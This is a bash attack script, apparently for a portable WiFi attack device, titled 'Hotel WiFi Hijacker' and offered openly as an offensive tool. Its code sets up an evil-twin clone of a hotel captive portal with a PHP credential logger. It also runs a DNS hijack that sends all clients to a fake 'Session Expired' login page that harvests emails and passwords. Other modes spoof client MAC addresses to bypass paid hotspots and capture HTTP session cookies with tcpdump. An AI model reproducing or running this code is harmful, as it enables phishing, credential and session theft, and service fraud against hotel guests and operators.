#!/bin/bash
# Title: Hotel WiFi Hijacker
# Author: bad-antics
# Description: Exploit hotel/hospitality WiFi systems
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/hotel_wifi"
mkdir -p "$LOOT_DIR"

PROMPT "HOTEL WIFI HIJACKER

Exploit hospitality WiFi:

• Bypass paid hotspots
• Clone guest portals
• Harvest room credentials
• DNS hijack sessions

Press OK to scan."

SPINNER_START "Scanning for hotel networks..."
timeout 15 airodump-ng wlan0 --write-interval 1 -w /tmp/hotel_scan --output-format csv 2>/dev/null
SPINNER_STOP

# Hotel network patterns
HOTEL_PATTERNS="Guest|Visitor|Lobby|Hotel|Inn|Resort|Marriott|Hilton|Holiday|Hyatt|IHG|Wyndham|Best Western|Conference|Meeting|Event|Public"

HOTEL_NETS=$(grep -iE "$HOTEL_PATTERNS" /tmp/hotel_scan*.csv 2>/dev/null | head -15)
OPEN_NETS=$(grep ",OPN," /tmp/hotel_scan*.csv 2>/dev/null | head -10)

HOTEL_COUNT=$(echo "$HOTEL_NETS" | grep -c "," 2>/dev/null || echo 0)
OPEN_COUNT=$(echo "$OPEN_NETS" | grep -c "," 2>/dev/null || echo 0)

PROMPT "Found:
• $HOTEL_COUNT hotel networks
• $OPEN_COUNT open networks

Select attack type."

ATTACK_TYPE=$(LIST_PICKER "Attack Mode:" "1. Portal Clone" "2. DNS Hijack" "3. MAC Spoof Bypass" "4. Session Sidejack")

case $ATTACK_TYPE in
    0) ATTACK="portal" ;;
    1) ATTACK="dns" ;;
    2) ATTACK="macspoof" ;;
    3) ATTACK="sidejack" ;;
    *) exit 0 ;;
esac

case $ATTACK in
    "portal")
        # Clone existing portal
        TARGET_NUM=$(NUMBER_PICKER "Clone network #:" 1)
        TARGET_LINE=$(echo "$HOTEL_NETS" | sed -n "${TARGET_NUM}p")
        TARGET_SSID=$(echo "$TARGET_LINE" | cut -d',' -f14 | tr -d ' ')
        
        SPINNER_START "Cloning portal..."
        
        # Connect briefly to capture portal
        wpa_supplicant -i wlan0 -c <(echo "network={ssid=\"$TARGET_SSID\" key_mgmt=NONE}") -B 2>/dev/null
        sleep 5
        dhclient wlan0 2>/dev/null
        sleep 3
        
        # Capture portal page
        PORTAL_IP=$(ip route | grep default | awk '{print $3}')
        wget -q -r -l 2 -k -p "http://$PORTAL_IP" -P /tmp/portal_clone 2>/dev/null
        
        # Kill connection
        killall wpa_supplicant dhclient 2>/dev/null
        
        SPINNER_STOP
        
        # Modify portal to capture creds
        PORTAL_DIR="/www/hotel_portal"
        mkdir -p "$PORTAL_DIR"
        cp -r /tmp/portal_clone/$PORTAL_IP/* "$PORTAL_DIR/" 2>/dev/null
        
        # Inject credential capture
        find "$PORTAL_DIR" -name "*.html" -exec sed -i 's|action="|action="/capture.php" data-orig="|g' {} \;
        
        cat > "$PORTAL_DIR/capture.php" << 'PHP'
<?php
$log = "/mmc/nullsec/hotel_wifi/creds_" . date("Ymd") . ".txt";
file_put_contents($log, date("H:i:s") . " | " . json_encode($_POST) . " | " . $_SERVER['REMOTE_ADDR'] . "\n", FILE_APPEND);
$orig = $_POST['data-orig'] ?? '/';
header("Location: $orig");
?>
PHP
        
        # Start evil twin with cloned portal
        hostapd_cli set_config ssid "$TARGET_SSID" 2>/dev/null
        php -S 0.0.0.0:80 -t "$PORTAL_DIR" &
        
        PROMPT "Portal cloned!

Evil twin active as:
$TARGET_SSID

Capturing credentials..."
        
        DURATION=$(NUMBER_PICKER "Run time (minutes):" 60)
        sleep $((DURATION * 60))
        
        killall php hostapd 2>/dev/null
        ;;
        
    "dns")
        PROMPT "DNS Hijack Mode

Will redirect all DNS
queries to phishing pages.

Target: All connected clients"
        
        # Setup DNS server
        cat > /tmp/dnsmasq_hotel.conf << 'DNSCONF'
address=/#/192.168.1.1
interface=wlan0
dhcp-range=192.168.1.10,192.168.1.250,12h
DNSCONF
        
        # Phishing pages for common services
        mkdir -p /www/phish/{google,facebook,microsoft}
        
        cat > /www/phish/index.html << 'PHISH'
<!DOCTYPE html>
<html><head><title>Login Required</title></head>
<body style="font-family:Arial;text-align:center;padding:50px;">
<h1>Session Expired</h1>
<p>Please log in again to continue.</p>
<form action="/grab.php" method="POST">
<input name="email" placeholder="Email" style="padding:10px;width:300px;"><br><br>
<input name="password" type="password" placeholder="Password" style="padding:10px;width:300px;"><br><br>
<button style="padding:10px 30px;">Login</button>
</form>
</body></html>
PHISH
        
        cp /www/phish/index.html /www/phish/google/
        cp /www/phish/index.html /www/phish/facebook/
        cp /www/phish/index.html /www/phish/microsoft/
        
        cat > /www/phish/grab.php << 'GRAB'
<?php
file_put_contents("/mmc/nullsec/hotel_wifi/dns_creds.txt", date("Y-m-d H:i:s")." | ".json_encode($_POST)." | ".$_SERVER['REMOTE_ADDR']."\n", FILE_APPEND);
echo "<h1>Error - Please try again later</h1>";
?>
GRAB
        cp /www/phish/grab.php /www/phish/google/
        cp /www/phish/grab.php /www/phish/facebook/
        cp /www/phish/grab.php /www/phish/microsoft/
        
        dnsmasq -C /tmp/dnsmasq_hotel.conf &
        php -S 0.0.0.0:80 -t /www/phish &
        
        PROMPT "DNS Hijack Active!

All DNS queries now
redirect to credential
capture pages.

Press OK when done."
        
        read -n 1
        killall dnsmasq php 2>/dev/null
        ;;
        
    "macspoof")
        PROMPT "MAC Spoof Bypass

Find authorized devices
and clone their MAC to
bypass paid hotspots."
        
        SPINNER_START "Finding authorized MACs..."
        
        # Scan for active clients
        timeout 30 airodump-ng wlan0 --write-interval 1 -w /tmp/mac_scan --output-format csv 2>/dev/null
        
        # Find clients with traffic (likely authorized)
        ACTIVE_MACS=$(grep -E "^[0-9A-Fa-f]{2}:" /tmp/mac_scan*.csv 2>/dev/null | awk -F',' '$7 > 1000 {print $1}' | head -10)
        
        SPINNER_STOP
        
        MAC_COUNT=$(echo "$ACTIVE_MACS" | wc -l)
        echo "$ACTIVE_MACS" | nl > /tmp/mac_list.txt
        
        PROMPT "Found $MAC_COUNT active clients

These likely have
internet access.

Select one to clone."
        
        TARGET_MAC_NUM=$(NUMBER_PICKER "Clone MAC #:" 1)
        TARGET_MAC=$(echo "$ACTIVE_MACS" | sed -n "${TARGET_MAC_NUM}p")
        
        # Save original MAC
        ORIG_MAC=$(ip link show wlan0 | grep ether | awk '{print $2}')
        echo "$ORIG_MAC" > "$LOOT_DIR/original_mac.txt"
        
        # Spoof MAC
        ip link set wlan0 down
        ip link set wlan0 address "$TARGET_MAC"
        ip link set wlan0 up
        
        PROMPT "MAC spoofed!

Original: $ORIG_MAC
Now: $TARGET_MAC

Try connecting to the
hotel WiFi now."
        ;;
        
    "sidejack")
        PROMPT "Session Sidejacking

Capture session cookies
from unencrypted traffic.

Requires: tcpdump"
        
        SPINNER_START "Capturing sessions..."
        
        # Capture HTTP cookies
        timeout 120 tcpdump -i wlan0 -w "$LOOT_DIR/sessions_$(date +%H%M).pcap" 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' 2>/dev/null &
        
        sleep 120
        
        SPINNER_STOP
        
        # Extract cookies
        strings "$LOOT_DIR/sessions_"*.pcap | grep -iE "cookie:|set-cookie:" > "$LOOT_DIR/cookies.txt"
        
        COOKIE_COUNT=$(wc -l < "$LOOT_DIR/cookies.txt")
        
        PROMPT "Sidejack complete!

Captured: $COOKIE_COUNT cookies

Check $LOOT_DIR for:
• .pcap files
• cookies.txt"
        ;;
esac

echo "=== Hotel WiFi Attack Log ===" >> "$LOOT_DIR/attack_log.txt"
echo "Type: $ATTACK" >> "$LOOT_DIR/attack_log.txt"
echo "Time: $(date)" >> "$LOOT_DIR/attack_log.txt"
echo "---" >> "$LOOT_DIR/attack_log.txt"
